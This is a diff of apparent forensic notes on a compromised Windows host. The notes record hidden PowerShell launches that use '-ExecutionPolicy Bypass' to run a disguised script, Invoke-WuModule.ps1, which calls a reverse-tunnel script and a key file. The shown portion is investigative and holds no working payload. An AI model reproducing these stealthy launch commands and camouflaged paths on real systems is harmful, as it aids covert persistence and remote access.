@@ -19,7 +19,9 @@ C:\Program Files\PowerShell\7\pwsh.exe -WindowStyle Hidden -NoProfile -Execution
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1"
 ```
 
-# Invoke-WuModule
+# Invoke-WuModule:
+- calls "Inner-ReverseTunnel.ps1"
+- both use the "pk.dat" file
 ```
 PS C:\Users\Administrator> gci C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1
 
@@ -50,6 +52,7 @@ Mode                 LastWriteTime         Length Name
 -a----         4/13/2026   8:49 AM            578 Invoke-WuModule.ps1
 -a----         4/13/2026   8:49 AM             76 pk.dat
 
+PS C:\Users\Administrator> type C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Inner-ReverseTunnel.ps1
 param(
     [Parameter(Mandatory = $true)]
     [string]$KeyPath,
